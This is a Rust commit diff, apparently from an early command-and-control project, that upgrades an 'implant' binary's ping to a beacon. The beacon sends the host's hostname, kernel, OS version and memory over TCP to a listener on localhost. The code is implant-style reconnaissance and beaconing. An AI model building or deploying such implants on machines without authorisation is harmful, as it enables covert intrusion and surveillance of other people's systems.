d2f0d3c1e029ead1bc75ef0a75763e91c7e72d8a
n0op3 <n0op3@proton.me>
2025-08-30 22:24:07 +0200

    beacon packet

--- common/src/lib.rs
+++ common/src/lib.rs
@@ -1,6 +1,34 @@
 use bincode::{Decode, Encode};
+use sysinfo::System;
 
 #[derive(Debug, Encode, Decode)]
 pub enum Packet {
-    Ping { timestamp: u128 },
+    Beacon {
+        timestamp: u128,
+        system_info: SystemInfo,
+    },
+}
+
+#[derive(Debug, Encode, Decode)]
+pub struct SystemInfo {
+    memory: u64,
+    name: String,
+    kernel: String,
+    os_version: String,
+    hostname: String,
+}
+
+impl SystemInfo {
+    pub fn get() -> Self {
+        let mut sys = System::new_all();
+        sys.refresh_all();
+
+        Self {
+            memory: (sys.total_memory() as f64 / 1024_u64.pow(3) as f64).ceil() as u64,
+            name: System::name().unwrap_or("unknown system name".to_string()),
+            kernel: System::kernel_long_version(),
+            os_version: System::os_version().unwrap_or("unknown OS version".to_string()),
+            hostname: System::host_name().unwrap_or("unknown hostname".to_string()),
+        }
+    }
 }
--- implant/src/main.rs
+++ implant/src/main.rs
@@ -5,16 +5,17 @@ use std::{
 };
 
 use bincode::config;
-use common::Packet;
+use common::{Packet, SystemInfo};
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let mut connection = TcpStream::connect("127.0.0.1:9120")?;
 
-    let packet = Packet::Ping {
+    let packet = Packet::Beacon {
         timestamp: SystemTime::now()
             .duration_since(UNIX_EPOCH)
             .unwrap()
             .as_millis(),
+        system_info: SystemInfo::get(),
     };
 
     connection.write(
